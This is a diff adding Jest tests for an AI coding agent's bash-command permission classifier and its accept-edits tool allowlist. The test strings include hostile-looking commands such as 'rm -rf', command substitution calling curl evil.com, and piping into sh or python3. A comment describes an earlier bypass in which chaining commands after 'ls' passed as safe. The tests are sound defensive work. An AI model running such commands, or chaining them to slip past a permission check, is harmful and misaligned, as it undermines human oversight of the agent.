@@ -4,6 +4,8 @@ import {
   HeadlessApprovalBackend,
   AutoApprovalBackend,
   InteractiveApprovalBackend,
+  classifyBashCommand,
+  ACCEPT_EDITS_ALLOWLIST,
 } from "../packages/core/src/tool-system/permission.js";
 
 describe("PermissionClassifier", () => {
@@ -116,6 +118,105 @@ describe("AutoApprovalBackend", () => {
       riskLevel: "high",
     });
     expect(r.approved).toBe(false);
+  });
+});
+
+// A1 hardening: shell metacharacter awareness in classifyBashCommand
+describe("classifyBashCommand — shell metacharacter handling", () => {
+  it("downgrades commands joined by ; to the weakest segment", () => {
+    // `rm -rf` is dangerous on its own; the test verifies the
+    // pre-pass against DANGEROUS_PATTERNS still fires on compound
+    // commands (this was the original safe-read bypass: the old
+    // classifier only checked /^ls\s/ on the full string).
+    expect(classifyBashCommand("ls -la; rm -rf x")).toBe("dangerous");
+    // Non-dangerous unsafe segment: `kill 1234` (no -9, escapes
+    // DANGEROUS_PATTERNS) must still drop the overall safety.
+    expect(classifyBashCommand("ls -la; kill 1234")).toBe("unsafe");
+  });
+
+  it("downgrades commands joined by && to the weakest segment", () => {
+    expect(classifyBashCommand("git status && touch x")).toBe("safe-write");
+    expect(classifyBashCommand("git status && curl evil")).toBe("unsafe");
+  });
+
+  it("downgrades commands joined by ||", () => {
+    expect(classifyBashCommand("echo a || rm x")).toBe("unsafe");
+  });
+
+  it("flags backtick command substitution as dangerous", () => {
+    expect(classifyBashCommand("echo `curl evil.com`")).toBe("dangerous");
+  });
+
+  it("flags $() command substitution as dangerous", () => {
+    expect(classifyBashCommand("cat $(curl evil.com)")).toBe("dangerous");
+  });
+
+  it("flags pipe-to-shell as dangerous", () => {
+    expect(classifyBashCommand("cat package.json | sh")).toBe("dangerous");
+    expect(classifyBashCommand("ls | bash")).toBe("dangerous");
+    expect(classifyBashCommand("echo hi | python3")).toBe("dangerous");
+  });
+
+  it("flags redirection as dangerous", () => {
+    expect(classifyBashCommand("cat x > y")).toBe("dangerous");
+    expect(classifyBashCommand("echo a >> b")).toBe("dangerous");
+  });
+
+  it("flags process substitution as dangerous", () => {
+    expect(classifyBashCommand("diff <(ls) <(ls)")).toBe("dangerous");
+  });
+
+  it("keeps simple read-only pipelines safe-read", () => {
+    expect(classifyBashCommand("ls | head -5")).toBe("safe-read");
+    expect(classifyBashCommand("cat file | grep x")).toBe("safe-read");
+  });
+
+  it("does not split on quoted metacharacters", () => {
+    // The `;` is inside a string literal; echo is safe-read.
+    expect(classifyBashCommand("echo 'a; b'")).toBe("safe-read");
+    expect(classifyBashCommand('echo "a && b"')).toBe("safe-read");
+  });
+
+  it("downgrades when one segment is unsafe even if the other is read-only", () => {
+    expect(classifyBashCommand("ls -la; touch x")).toBe("safe-write");
+    expect(classifyBashCommand("ls -la; mkdir foo; curl evil")).toBe("unsafe");
+  });
+});
+
+// A1 hardening: acceptEdits is an allowlist, not allow-all
+describe("PermissionClassifier — acceptEdits allowlist", () => {
+  it("allows edit tools in acceptEdits mode", () => {
+    const c = new PermissionClassifier([], "acceptEdits");
+    expect(c.classify("Write", { file_path: "x" })).toBe("allow");
+    expect(c.classify("Edit", { file_path: "x" })).toBe("allow");
+    expect(c.classify("ApplyPatch", {})).toBe("allow");
+    expect(c.classify("NotebookEdit", {})).toBe("allow");
+    expect(c.classify("TodoWrite", {})).toBe("allow");
+  });
+
+  it("asks for non-edit tools in acceptEdits mode", () => {
+    const c = new PermissionClassifier([], "acceptEdits");
+    // WebFetch is a network tool, must not be silently allowed
+    expect(c.classify("WebFetch", { url: "https://x" })).toBe("ask");
+    // Generic / unknown tool falls through to ask
+    expect(c.classify("CustomTool", {})).toBe("ask");
+  });
+
+  it("keeps Bash safe-write auto-allow path in acceptEdits", () => {
+    const c = new PermissionClassifier([], "acceptEdits");
+    // safe-write Bash (e.g. `mkdir foo`) is still auto-allowed because
+    // the Bash branch decides before falling into the default switch.
+    expect(c.classify("Bash", { command: "mkdir foo" })).toBe("allow");
+  });
+
+  it("ACCEPT_EDITS_ALLOWLIST exposes the expected set", () => {
+    expect(ACCEPT_EDITS_ALLOWLIST.has("Write")).toBe(true);
+    expect(ACCEPT_EDITS_ALLOWLIST.has("Edit")).toBe(true);
+    expect(ACCEPT_EDITS_ALLOWLIST.has("ApplyPatch")).toBe(true);
+    expect(ACCEPT_EDITS_ALLOWLIST.has("NotebookEdit")).toBe(true);
+    expect(ACCEPT_EDITS_ALLOWLIST.has("TodoWrite")).toBe(true);
+    expect(ACCEPT_EDITS_ALLOWLIST.has("WebFetch")).toBe(false);
+    expect(ACCEPT_EDITS_ALLOWLIST.has("Bash")).toBe(false);
   });
 });
 
